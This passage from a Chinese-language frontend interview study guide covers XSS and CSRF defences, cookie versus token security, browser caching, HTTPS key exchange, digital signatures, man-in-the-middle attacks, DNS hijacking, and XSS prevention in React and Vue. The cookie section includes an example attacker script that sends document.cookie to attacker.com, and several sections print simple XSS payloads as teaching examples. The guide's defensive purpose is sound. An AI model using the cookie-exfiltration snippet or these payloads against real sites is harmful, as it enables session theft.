3. **Content Security Policy (CSP)**
   ```
   Content-Security-Policy: default-src 'self'
   ```
   - 限制脚本来源
   - 阻止内联脚本

4. **HttpOnly Cookie**
   ```
   Set-Cookie: sessionid=xxx; HttpOnly
   ```
   - 防止 JavaScript 读取 Cookie

5. **使用安全的 API**
   - `textContent` 代替 `innerHTML`
   - `setAttribute` 代替拼接字符串

**CSRF vs XSS：**

| 特性 | CSRF | XSS |
|------|------|-----|
| 攻击目标 | 服务器 | 客户端 |
| 利用点 | 用户已登录状态 | 网站未过滤用户输入 |
| 执行位置 | 服务器 | 浏览器 |
| Cookie | 自动携带 | 可以获取（非 HttpOnly） |
| 防御重点 | Token、SameSite | 输入过滤、输出编码、CSP |

---

## 21、cookie 和 token 都存放在 header 里面，为什么只劫持前者？

**为什么 Cookie 容易被劫持而 Token 不容易：**

**1. 存储方式不同**
- **Cookie**：浏览器自动管理
  - 每次请求自动携带
  - 不需要手动设置
  - 浏览器自动发送到同域名下

- **Token**：需要手动管理
  - 存储在 localStorage、sessionStorage 或内存中
  - 请求时需要手动添加到 Header
  - 不会自动发送

**2. 自动发送机制**
```javascript
// Cookie - 自动发送
fetch('/api/user'); // 自动携带 Cookie

// Token - 手动发送
fetch('/api/user', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**3. XSS 攻击影响**
- **Cookie**：如果被劫持，可以获取整个 Cookie（包括 HttpOnly 的可能通过其他方式）
- **Token**：即使被 XSS 劫持，也需要知道如何使用（格式、位置等）

**4. 跨域限制**
- **Cookie**：可以通过 `withCredentials` 跨域携带
- **Token**：手动控制是否发送

**5. Csrf 防御**
- **Cookie**：容易受到 CSRF 攻击（自动发送）
- **Token**：不自动发送，不受 CSRF 影响

**实际示例：**

**Cookie 劫持：**
```javascript
// 攻击者脚本
const cookie = document.cookie;
fetch('https://attacker.com/steal?cookie=' + cookie);
```

**Token 防御：**
```javascript
// 需要知道 Token 的存储位置
// 需要知道 Token 的使用方式
// 需要知道 API 地址
```

**最佳实践：**
1. **Cookie + HttpOnly + SameSite**
   - 防止 XSS 读取
   - 防止 CSRF

2. **Token + 短期有效**
   - 即使泄露，有效期短
   - 可以随时失效

3. **双 Token 机制**
   - Access Token（短期）
   - Refresh Token（长期，存储在 HttpOnly Cookie）

---

## 22、客户端缓存有几种方式？浏览器出现 from disk、form memory 的策略是什么？

**客户端缓存方式：**

**1. HTTP 缓存**
- **强缓存**
  - Cache-Control
  - Expires

- **协商缓存**
  - ETag
  - Last-Modified

**2. 浏览器缓存类型**
- **内存缓存（Memory Cache）**
- **磁盘缓存（Disk Cache）**
- **Service Worker 缓存**

**3. 本地存储**
- **LocalStorage**
  - 持久化存储
  - 容量 5-10MB
  - 不随请求发送

- **SessionStorage**
  - 会话级存储
  - 标签页关闭即清除
  - 容量 5-10MB

- **IndexedDB**
  - 大量数据存储
  - 支持事务
  - 容量 50MB+

- **WebSQL**
  - 已废弃

**4. 应用缓存（App Cache）**
- 已被 Service Worker 取代

**浏览器缓存策略（from disk vs from memory）：**

**内存缓存（Memory Cache）：**
- **特点：**
  - 存储在内存中
  - 访问速度最快
  - 浏览器关闭即清除
  - 容量有限

- **缓存内容：**
  - 当前页面正在使用的资源
  - 预加载的资源
  - 小文件（图片、脚本、样式）

- **策略：**
  - 频繁访问的资源优先
  - 当前页面相关的资源
  - 预解析的资源

**磁盘缓存（Disk Cache）：**
- **特点：**
  - 存储在硬盘中
  - 访问速度较慢
  - 浏览器关闭后仍然存在
  - 容量较大

- **缓存内容：**
  - 大文件（视频、大图片）
  - 不常用的资源
  - 需要持久化的资源

- **策略：**
  - 设置了较长缓存时间的资源
  - 体积较大的资源
  - 不经常变动的资源

**缓存决策策略：**

```
1. 检查内存缓存
   ↓ 命中 → from memory cache
   ↓ 未命中

2. 检查磁盘缓存
   ↓ 命中 → from disk cache
   ↓ 未命中

3. 发送网络请求
```

**内存缓存 vs 磁盘缓存：**

| 特性 | Memory Cache | Disk Cache |
|------|--------------|------------|
| 速度 | 最快 | 较快 |
| 容量 | 小 | 大 |
| 持久性 | 浏览器关闭清除 | 持久保存 |
| 典型内容 | 小文件、当前页面资源 | 大文件、历史资源 |
| 优先级 | 高 | 低 |

**影响缓存位置的因素：**

1. **文件大小**
   - 小文件 → 内存缓存
   - 大文件 → 磁盘缓存

2. **访问频率**
   - 频繁访问 → 内存缓存
   - 不常访问 → 磁盘缓存

3. **缓存时间**
   - 短期 → 内存缓存
   - 长期 → 磁盘缓存

4. **资源类型**
   - 图片、脚本 → 内存缓存
   - 视频、大文件 → 磁盘缓存

5. **内存压力**
   - 内存紧张 → 淘汰到磁盘

**Chrome DevTools 显示：**
- **from memory cache**：资源从内存缓存加载
- **from disk cache**：资源从磁盘缓存加载
- **Size 列显示大小**

**优化建议：**
1. 重要资源设置较短缓存时间
2. 不常变动的资源设置较长缓存时间
3. 使用 Service Worker 实现更灵活的缓存控制
4. 合理使用 Cache-Control
5. 大文件使用 CDN

---

## 23、说一下 https 获取加密密钥的过程。

**HTTPS 密钥获取过程（基于 RSA）：**

**1. 客户端生成随机数**
```
Client Random = 32 字节随机数
```

**2. 服务端生成随机数**
```
Server Random = 32 字节随机数
```

**3. 客户端生成预主密钥**
```
Pre-Master Secret = 48 字节随机数
```

**4. 客户端加密预主密钥**
```
使用服务器的公钥加密 Pre-Master Secret
Encrypted Pre-Master Secret = Encrypt_RSA(Public_Key, Pre-Master Secret)
```

**5. 发送加密的预主密钥**
```
客户端 → 服务端：Encrypted Pre-Master Secret
```

**6. 服务端解密预主密钥**
```
Pre-Master Secret = Decrypt_RSA(Private_Key, Encrypted Pre-Master Secret)
```

**7. 双方生成主密钥**
```
Master Secret = PRF(Pre-Master Secret + Client Random + Server Random)
```
- PRF：伪随机函数
- 输入：预主密钥 + 两个随机数
- 输出：48 字节的主密钥

**8. 生成会话密钥**
```
从 Master Secret 派生：
- 客户端加密密钥（Client Write Key）
- 服务端加密密钥（Server Write Key）
- 客户端 MAC 密钥（Client MAC Key）
- 服务端 MAC 密钥（Server MAC Key）
- 客户端 IV（Client Write IV）
- 服务端 IV（Server Write IV）
```

**9. 使用会话密钥加密通信**
```
客户端发送数据：Encrypt(Client Write Key, Data)
服务端接收数据：Decrypt(Server Write Key, Data)
```

**基于 ECDHE（椭圆曲线 Diffie-Hellman）：**

**1. 双方交换公钥**
```
客户端 → 服务端：Client Public Key
服务端 → 客户端：Server Public Key
```

**2. 双方计算共享密钥**
```
Shared Secret = ECDH(Private_Key, Peer_Public_Key)
```

**3. 生成主密钥**
```
Master Secret = PRF(Shared Secret + Client Random + Server Random)
```

**4. 生成会话密钥**
```
同上，派生各种加密密钥
```

**ECDHE 优势：**
- 前向安全性：即使长期私钥泄露，也无法解密过去的通信
- 密钥交换更快

**TLS 1.3 密钥派生：**

**1. 客户端发送密钥共享参数**
```
Client Hello 包含密钥共享参数
```

**2. 服务端发送密钥共享参数**
```
Server Hello 包含密钥共享参数
```

**3. 双方计算共享密钥**
```
Shared Secret = Diffie-Hellman(Client_Share, Server_Share)
```

**4. 派生密钥**
```
使用 HKDF (HMAC-based Extract-and-Expand Key Derivation Function)
- Early Secret
- Handshake Secret
- Master Secret
- Application Traffic Keys
```

**密钥层次结构（TLS 1.3）：**
```
Shared Secret
    ↓ HKDF-Extract
Early Secret
    ↓ Derive-Secret
Handshake Secret
    ↓ Derive-Secret
Master Secret
    ↓ Derive-Secret
Application Traffic Keys (0-RTT, Handshake, Application)
```

**总结：**
- RSA：简单但不具备前向安全性
- ECDHE：具备前向安全性，推荐使用
- TLS 1.3：使用 HKDF，更安全的密钥派生

---

## 24、介绍一下数字签名的原理。

**数字签名原理：**

**作用：**
1. 验证身份（谁发送的）
2. 验证完整性（是否被篡改）
3. 不可抵赖性（发送方无法否认）

**数字签名过程：**

**1. 发送方操作**
```
步骤1：计算消息的哈希值
Hash = Hash_Function(Message)

步骤2：使用私钥加密哈希值
Signature = Encrypt(Private_Key, Hash)

步骤3：发送消息 + 签名
发送：Message + Signature
```

**2. 接收方操作**
```
步骤1：使用公钥解密签名
Hash1 = Decrypt(Public_Key, Signature)

步骤2：计算消息的哈希值
Hash2 = Hash_Function(Message)

步骤3：比较两个哈希值
if Hash1 == Hash2:
    签名验证成功
else:
    签名验证失败
```

**为什么能验证身份：**
- 只有私钥持有者才能生成有效签名
- 公钥无法伪造签名

**为什么能验证完整性：**
- 任何消息修改都会导致哈希值变化
- 签名与消息哈希不匹配即说明被篡改

**为什么不可抵赖：**
- 签名只能用私钥生成
- 私钥只有发送方持有

**实际应用：**

**1. HTTPS 证书签名**
```
CA 使用私钥对网站证书签名
浏览器使用 CA 公钥验证签名
```

**2. 软件签名**
```
开发者使用私钥对软件签名
用户验证签名确保软件未被篡改
```

**3. 代码签名**
```
代码仓库提交签名
验证提交者身份
```

**4. 电子合同**
```
对合同内容签名
验证签署者身份和合同完整性
```

**常见签名算法：**

1. **RSA 签名**
   - 基于大数分解难题
   - 常用：RSA-PSS

2. **ECDSA（椭圆曲线数字签名算法）**
   - 基于椭圆曲线离散对数问题
   - 优点：签名短，速度快
   - 常用：ECDSA-P256

3. **EdDSA**
   - 基于扭曲爱德华兹曲线
   - 优点：更安全，更快
   - 常用：Ed25519

**签名 vs 加密：**

| 操作 | 加密 | 签名 |
|------|------|------|
| 目的 | 保密 | 认证、完整 |
| 发送方 | 使用接收方公钥 | 使用发送方私钥 |
| 接收方 | 使用接收方私钥 | 使用发送方公钥 |
| 结果 | 只有接收方能解密 | 任何人都能验证 |

**实际代码示例（Node.js）：**

```javascript
const crypto = require('crypto');

// 生成密钥对
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048
});

// 签名
const message = 'Hello, World!';
const sign = crypto.createSign('SHA256');
sign.update(message);
const signature = sign.sign(privateKey, 'base64');

// 验证
const verify = crypto.createVerify('SHA256');
verify.update(message);
const isValid = verify.verify(publicKey, signature, 'base64');

console.log('Signature valid:', isValid);
```

---

## 25、什么是中间人攻击，如何解决？

**中间人攻击（Man-in-the-Middle Attack, MITM）：**

**定义：**
攻击者在通信双方之间拦截、篡改、窃听通信内容，而双方都以为在直接与对方通信。

**攻击类型：**

**1. 窃听型**
```
正常流程：
客户端 ←──→ 服务端

中间人攻击：
客户端 ←──→ 攻击者 ←──→ 服务端
         (窃听内容)
```
- 攻击者可以读取所有通信内容
- 不修改通信内容

**2. 篡改型**
```
正常流程：
客户端 ←──→ 服务端

中间人攻击：
客户端 ←──→ 攻击者 ←──→ 服务端
         (篡改内容)
```
- 攻击者修改通信内容
- 例如：篡改交易金额、URL 等

**3. 劫持型**
```
正常流程：
客户端 ←──→ 服务端

中间人攻击：
客户端 ←──→ 攻击者
         (完全接管会话)
```
- 攻击者完全接管会话
- 断开与服务端的连接

**常见场景：**

**1. 公共 WiFi**
```
攻击者搭建虚假 WiFi
用户连接后所有流量经过攻击者
```

**2. ARP 欺骗**
```
攻击者伪造 ARP 响应
将网关 IP 映射到攻击者 MAC
所有流量重定向到攻击者
```

**3. DNS 欺骗**
```
攻击者篡改 DNS 响应
将域名解析到攻击者服务器
```

**4. HTTPS 降级攻击**
```
攻击者强制使用 HTTP
拦截明文传输的数据
```

**防御措施：**

**1. 使用 HTTPS**
```
所有通信使用 HTTPS 加密
即使被拦截也无法解密
```

**2. HSTS（HTTP Strict Transport Security）**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
- 强制使用 HTTPS
- 防止降级攻击

**3. 证书固定（Certificate Pinning）**
```javascript
// 客户端内置证书或公钥
const pinnedPublicKey = '...';
// 验证服务器证书是否匹配
```
- 防止伪造证书
- 移动应用常用

**4. DNS over HTTPS (DoH)**
```
加密 DNS 查询
防止 DNS 欺骗
```

**5. VPN**
```
加密所有网络流量
绕过公共 WiFi 风险
```

**6. 双向认证**
```
客户端也验证服务器证书
服务器也验证客户端证书
```

**7. 避免公共 WiFi**
```
使用移动数据
或可信的 WiFi 网络
```

**HTTPS 如何防御中间人攻击：**

**1. 证书验证**
```
客户端验证服务器证书
- CA 签名
- 证书有效期
- 证书域名
- 证书吊销状态
```

**2. 密钥交换**
```
使用 ECDHE 等算法
即使长期私钥泄露
也无法解密过去通信
```

**3. 完整性验证**
```
消息认证码 (MAC)
确保数据未被篡改
```

**检测中间人攻击：**

**1. 证书错误**
```
浏览器提示证书不匹配
可能是中间人攻击
```

**2. 延迟异常**
```
连接延迟突然增加
可能是流量被重定向
```

**3. 流量异常**
```
检查流量异常
使用 Wireshark 分析
```

**最佳实践：**
1. 所有网站使用 HTTPS
2. 配置 HSTS
3. 定期更新证书
4. 使用强加密算法
5. 禁用旧协议（SSL、TLS 1.0/1.1）
6. 移动应用使用证书固定
7. 用户避免使用公共 WiFi

---

## 26、什么是运营商 DNS 劫持，如何解决？

**运营商 DNS 劫持：**

**定义：**
运营商（ISP）强制将用户的 DNS 查询指向自己的 DNS 服务器，返回的不是真实 IP 地址，而是运营商控制的 IP。

**劫持类型：**

**1. DNS 返回错误 IP**
```
正常流程：
用户查询 www.example.com
→ DNS 返回 93.184.216.34
→ 访问真实网站

劫持流程：
用户查询 www.example.com
→ 运营商 DNS 返回 1.2.3.4（运营商服务器）
→ 访问运营商的广告页面或错误页面
```

**2. DNS 缓存投毒**
```
运营商在 DNS 响应中注入虚假记录
用户获得错误的 IP 地址
```

**3. DNS 重定向**
```
访问不存在的域名
被重定向到运营商的导航页、广告页
```

**劫持目的：**
- 推广运营商产品
- 展示广告（获取收益）
- 收集用户行为数据
- 限制访问某些网站

**识别 DNS 劫持：**

**1. IP 地址异常**
```
访问的网站 IP 不是真实 IP
```

**2. 页面异常**
```
出现运营商广告、导航页
或错误提示页面
```

**3. 检测工具**
```bash
# 使用 dig 命令
dig www.example.com

# 比较不同 DNS 服务器返回的 IP
```

**解决方案：**

**1. 使用公共 DNS**
```
Google DNS: 8.8.8.8, 8.8.4.4
Cloudflare DNS: 1.1.1.1, 1.0.0.1
阿里 DNS: 223.5.5.5, 223.6.6.6
腾讯 DNS: 119.29.29.29, 182.254.116.116
百度 DNS: 180.76.76.76
```

**修改 DNS 配置：**

**Windows:**
```
控制面板 → 网络和共享中心 → 更改适配器设置
→ 右键网络连接 → 属性 → Internet 协议版本 4 (TCP/IPv4)
→ 使用下面的 DNS 服务器地址
→ 首选 DNS: 8.8.8.8
→ 备用 DNS: 8.8.4.4
```

**macOS:**
```
系统偏好设置 → 网络 → 高级 → DNS
→ 添加 DNS 服务器: 8.8.8.8
```

**Linux:**
```bash
# 修改 /etc/resolv.conf
nameserver 8.8.8.8
nameserver 8.8.4.4

# 或使用 systemd-resolved
sudo systemctl restart systemd-resolved
```

**2. DNS over HTTPS (DoH)**
```
加密 DNS 查询
防止运营商篡改
```

**配置 DoH（Chrome/Firefox）：**
```
设置 → 隐私和安全 → 安全 → 使用安全的 DNS
→ 选择服务提供商（如 Cloudflare）
```

**3. DNS over TLS (DoT)**
```
加密 DNS 查询
使用 TLS 协议
```

**4. DNSSEC**
```
DNS 安全扩展
验证 DNS 响应的真实性
防止 DNS 劫持
```

**5. 使用 VPN**
```
加密所有网络流量
包括 DNS 查询
绕过运营商 DNS
```

**6. 修改 hosts 文件**
```
直接指定域名 IP
跳过 DNS 查询
```

**Windows:**
```
C:\Windows\System32\drivers\etc\hosts
```

**Linux/macOS:**
```
/etc/hosts
```

**示例：**
```
93.184.216.34 www.example.com
93.184.216.34 example.com
```

**7. 使用 HTTPS**
```
即使 DNS 被劫持
HTTPS 会验证证书
防止访问虚假网站
```

**8. 使用代理或加速器**
```
通过代理服务器访问
绕过运营商 DNS
```

**推荐方案（按优先级）：**

1. **使用公共 DNS + DoH**
   - 简单有效
   - 大部分浏览器支持

2. **使用 HTTPS + HSTS**
   - 防止访问虚假网站
   - 即使 DNS 被劫持

3. **使用 VPN**
   - 全面加密
   - 绕过运营商限制

4. **修改 hosts 文件**
   - 适用于常用网站
   - 手动维护

**最佳实践：**
1. 使用公共 DNS（如 Cloudflare 1.1.1.1）
2. 启用 DNS over HTTPS
3. 所有网站使用 HTTPS
4. 配置 HSTS
5. 定期检查 DNS 设置
6. 避免使用运营商提供的 DNS

---

## 27、React XSS 如何防范和解决？

**React XSS 防范：**

**React 默认的 XSS 防护：**

**1. 自动转义**
```jsx
// React 会自动转义
const userInput = '<script>alert("XSS")</script>';

// 直接渲染，自动转义
<div>{userInput}</div>
// 输出: <script>alert("XSS")</script>
// 安全，不会执行脚本
```

**2. JSX 默认转义**
```jsx
// 所有 JSX 中的内容都会被转义
const html = '<img src=x onerror=alert(1)>';
<div>{html}</div>
// 安全
```

**危险的 XSS 场景：**

**1. dangerouslySetInnerHTML**
```jsx
// 危险！直接渲染 HTML
const userInput = '<script>alert("XSS")</script>';
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// 会执行脚本，不安全
```

**解决方案：**
```jsx
// 方案1: 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';

const cleanHtml = DOMPurify.sanitize(userInput);
<div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
// 安全

// 方案2: 使用白名单标签
import sanitizeHtml from 'sanitize-html';

const cleanHtml = sanitizeHtml(userInput, {
  allowedTags: ['b', 'i', 'em', 'strong'],
  allowedAttributes: {}
});
```

**2. href 中的 javascript:**
```jsx
// 危险！
const userInput = 'javascript:alert(1)';
<a href={userInput}>点击</a>
// 点击会执行脚本
```

**解决方案：**
```jsx
// 验证 URL
const isValidUrl = (url) => {
  return url.startsWith('http://') || url.startsWith('https://');
};

<a href={isValidUrl(userInput) ? userInput : '#'}>点击</a>
// 安全
```

**3. 动态执行代码（eval, Function）**
```jsx
// 危险！
const code = 'alert("XSS")';
eval(code);
new Function(code)();
```

**解决方案：**
```jsx
// 避免使用 eval 和 Function
// 使用安全的方式处理动态行为
```

**4. 动态属性名**
```jsx
// 危险！
const userInput = 'onclick="alert(1)"';
<div {...{ [userInput]: true }} />
```

**解决方案：**
```jsx
// 使用白名单属性
const safeProps = {
  onClick: handleClick
};
<div {...safeProps} />
```

**完整的 XSS 防护方案：**

**1. 安装安全依赖**
```bash
npm install dompurify sanitize-html
```

**2. 创建安全的 HTML 渲染组件**
```jsx
import DOMPurify from 'dompurify';

const SafeHtml = ({ html }) => {
  const cleanHtml = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
};

// 使用
<SafeHtml html="<p>Hello</p>" />
```

**3. URL 验证工具**
```jsx
const isValidUrl = (url) => {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};

<a href={isValidUrl(url) ? url : '#'}>Link</a>
```

**4. 内容安全策略 (CSP)**
```jsx
// 在 index.html 中配置
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'">
```

**5. 输入验证**
```jsx
const validateInput = (input) => {
  // 白名单验证
  const allowed = /^[a-zA-Z0-9\s.,!?]+$/;
  return allowed.test(input);
};
```

**6. 使用 TypeScript**
```typescript
// TypeScript 可以帮助发现类型错误
interface Props {
  html?: string;
  className?: string;
}

const Component: React.FC<Props> = ({ html, className }) => {
  if (!html) return null;
  return <div className={className}>{html}</div>;
};
```

**React Router XSS 防护：**
```jsx
// 使用 useParams 时
import { useParams } from 'react-router-dom';

const User = () => {
  const { id } = useParams();
  // React 会自动转义 id
  return <div>User ID: {id}</div>;
  // 安全
};
```

**最佳实践：**

1. **避免使用 dangerouslySetInnerHTML**
   - 除非绝对必要
   - 总是使用 DOMPurify 清理

2. **不使用 eval 和 Function**
   - 使用安全的方式实现动态行为

3. **验证所有用户输入**
   - 白名单验证
   - 类型检查

4. **使用 TypeScript**
   - 类型安全
   - 减少运行时错误

5. **配置 CSP**
   - 限制脚本来源
   - 防止内联脚本执行

6. **使用安全库**
   - dompurify
   - sanitize-html
   - validator.js

7. **定期更新依赖**
   - 修复安全漏洞

8. **代码审查**
   - 检查危险的 API 使用
   - 审查第三方库

**示例：安全的数据展示组件**
```jsx
import React from 'react';
import DOMPurify from 'dompurify';

interface SafeHtmlProps {
  html: string;
  allowedTags?: string[];
}

export const SafeHtml: React.FC<SafeHtmlProps> = ({ 
  html, 
  allowedTags = ['b', 'i', 'em', 'strong', 'p'] 
}) => {
  const config = {
    ALLOWED_TAGS: allowedTags,
    KEEP_CONTENT: true
  };
  
  DOMPurify.setConfig(config);
  const cleanHtml = DOMPurify.sanitize(html);
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
};
```

---

## 28、Vue XSS 如何防范和解决？

**Vue XSS 防范：**

**Vue 默认的 XSS 防护：**

**1. 模板语法自动转义**
```vue
<template>
  <!-- Vue 自动转义 -->
  <div>{{ userInput }}</div>
</template>

<script>
export default {
  data() {
    return {
      userInput: '<script>alert("XSS")</script>'
    };
  }
};
</script>

<!-- 输出: <script>alert("XSS")</script> -->
<!-- 安全，不会执行脚本 -->
```

**2. 插值表达式默认转义**
```vue
<template>
  <p>{{ htmlContent }}</p>
</template>
```

**危险的 XSS 场景：**

**1. v-html 指令**
```vue
<template>
  <!-- 危险！直接渲染 HTML -->
  <div v-html="userInput"></div>
</template>

<script>
export default {
  data() {
    return {
      userInput: '<img src=x onerror=alert(1)>'
    };
  }
};
</script>

<!-- 会执行脚本，不安全 -->
```

**解决方案：**
```vue
<template>
  <!-- 使用 dompurify 清理 HTML -->
  <div v-html="sanitizedHtml"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  data() {
    return {
      userInput: '<img src=x onerror=alert(1)>'
    };
  },
  computed: {
    sanitizedHtml() {
      return DOMPurify.sanitize(this.userInput);
    }
  }
};
</script>

<!-- 安全 -->
```

**2. 动态绑定中的 javascript:**
```vue
<template>
  <!-- 危险！ -->
  <a :href="userUrl">点击</a>
</template>

<script>
export default {
  data() {
    return {
      userUrl: 'javascript:alert(1)'
    };
  }
};
</script>
```

**解决方案：**
```vue
<template>
  <a :href="isValidUrl(userUrl) ? userUrl : '#'">点击</a>
</template>

<script>
export default {
  data() {
    return {
      userUrl: 'javascript:alert(1)'
    };
  },
  methods: {
    isValidUrl(url) {
      try {
        const parsed = new URL(url);
        return ['http:', 'https:'].includes(parsed.protocol);
      } catch {
        return false;
      }
    }
  }
};
</script>
```

**3. 动态执行代码**
```vue
<script>
export default {
  methods: {
    // 危险！
    executeCode(code) {
      eval(code); // 不安全
      new Function(code)(); // 不安全
    }
  }
};
</script>
```

**解决方案：**
```vue
<script>
export default {
  methods: {
    // 使用安全的方式
    executeCode(code) {
      // 避免使用 eval 和 Function
      // 使用预定义的安全函数
    }
  }
};
</script>
```

**4. 动态组件和 props**
```vue
<template>
  <!-- 危险：接收未验证的 HTML 作为 prop -->
  <component :is="componentName" :html-content="userHtml" />
</template>
```

**解决方案：**
```vue
<template>
  <!-- 清理后再传递 -->
  <component :is="componentName" :html-content="sanitizedHtml" />
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  data() {
    return {
      componentName: 'my-component',
      userHtml: '<img src=x onerror=alert(1)>'
    };
  },
  computed: {
    sanitizedHtml() {
      return DOMPurify.sanitize(this.userHtml);
    }
  }
};
</script>
```

**5. Vue Router 动态路由**
```vue
<template>
  <div>User ID: {{ $route.params.id }}</div>
</template>
```
- Vue 会自动转义路由参数
- 安全

**完整的 XSS 防护方案：**

**1. 安装安全依赖**
```bash
npm install dompurify sanitize-html
```

**2. 创建安全的 HTML 组件**
```vue
<template>
  <div v-html="sanitizedHtml"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  name: 'SafeHtml',
  props: {
    html: {
      type: String,
      required: true
    },
    allowedTags: {
      type: Array,
      default: () => ['p', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li', 'a']
    }
  },
  computed: {
    sanitizedHtml() {
      DOMPurify.setConfig({
        ALLOWED_TAGS: this.allowedTags,
        KEEP_CONTENT: true
      });
      return DOMPurify.sanitize(this.html);
    }
  }
};
</script>

<!-- 使用 -->
<safe-html html="<p>Hello <b>World</b></p>" />
```

**3. URL 验证工具**
```javascript
// utils/urlValidator.js
export const isValidUrl = (url) => {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};
```

```vue
<template>
  <a :href="isValidUrl(userUrl) ? userUrl : '#'">链接</a>
</template>

<script>
import { isValidUrl } from '@/utils/urlValidator';

export default {
  data() {
    return {
      userUrl: 'javascript:alert(1)'
    };
  },
  methods: {
    isValidUrl
  }
};
</script>
```

**4. 内容安全策略 (CSP)**
```html
<!-- public/index.html -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'">
```

**5. 输入验证**
```javascript
// utils/validator.js
export const validateInput = (input, type = 'text') => {
  const validators = {
    text: /^[a-zA-Z0-9\s.,!?@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]*$/,
    email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    url: /^https?:\/\/.+$/
  };
  
  return validators[type] ? validators[type].test(input) : false;
};
```

**6. 使用 TypeScript**
```typescript
<script lang="ts">
import { defineComponent, PropType } from 'vue';

export default defineComponent({
  name: 'MyComponent',
  props: {
    htmlContent: {
      type: String as PropType<string>,
      required: true
    }
  }
});
</script>
```

**7. 全局指令**
```javascript
// directives/safe-html.js
import DOMPurify from 'dompurify';

export default {
  inserted(el, binding) {
    const allowedTags = binding.value?.allowedTags || [];
    DOMPurify.setConfig({
      ALLOWED_TAGS: allowedTags,
      KEEP_CONTENT: true
    });
    el.innerHTML = DOMPurify.sanitize(binding.value?.html || '');
  }
};
```

```javascript
// main.js
import safeHtml from './directives/safe-html';

app.directive('safe-html', safeHtml);
```

```vue
<template>
  <div v-safe-html="{ html: userInput, allowedTags: ['p', 'b'] }"></div>
</template>
```

**Vue 3 Composition API 防护：**

```vue
<template>
  <div v-html="sanitizedHtml"></div>
</template>

<script setup>
import { ref, computed } from 'vue';
import DOMPurify from 'dompurify';

const userInput = ref('<script>alert("XSS")</script>');

const sanitizedHtml = computed(() => {
  return DOMPurify.sanitize(userInput.value);
});
</script>
```

**最佳实践：**

1. **避免使用 v-html**
   - 除非绝对必要
   - 总是使用 DOMPurify 清理

2. **验证所有用户输入**
   - 白名单验证
   - 类型检查
   - 长度限制

3. **使用安全库**
   - dompurify
   - sanitize-html
   - validator.js

4. **配置 CSP**
   - 限制脚本来源
   - 防止内联脚本执行

5. **使用 TypeScript**
   - 类型安全
   - 减少运行时错误

6. **组件化安全处理**
   - 创建可复用的安全组件
   - 封装验证逻辑

7. **定期更新依赖**
   - 修复安全漏洞
   - 使用最新版本

8. **代码审查**
   - 检查 v-html 使用
   - 审查动态属性绑定

9. **使用 Vuex/Pinia**
   - 集中管理状态
   - 统一验证逻辑

10. **Vue Router 安全**
    - 验证路由参数
    - 使用路由守卫

**示例：完整的防护方案**

```vue
<template>
  <div class="secure-component">
    <!-- 安全的 HTML 渲染 -->
    <safe-html 
      :html="content" 
      :allowed-tags="['p', 'b', 'i', 'em']" 
    />
    
    <!-- 安全的链接 -->
    <a :href="safeUrl(url)">安全链接</a>
    
    <!-- 安全的输入 -->
    <input 
      v-model="input" 
      @input="validateInput"
      :class="{ invalid: !isValid }"
    />
  </div>
</template>

<script setup>
import { ref, computed } from 'vue';
import SafeHtml from '@/components/SafeHtml.vue';
import { isValidUrl } from '@/utils/validators';
import DOMPurify from 'dompurify';

const content = ref('<p>内容</p>');
const url = ref('https://example.com');
const input = ref('');
const isValid = ref(true);

const safeUrl = computed(() => isValidUrl(url.value) ? url.value : '#');

const validateInput = () => {
  // 白名单验证
  const allowed = /^[a-zA-Z0-9\s.,!?]+$/;
  isValid.value = allowed.test(input.value);
};
</script>

<style scoped>
.invalid {
  border-color: red;
}
</style>
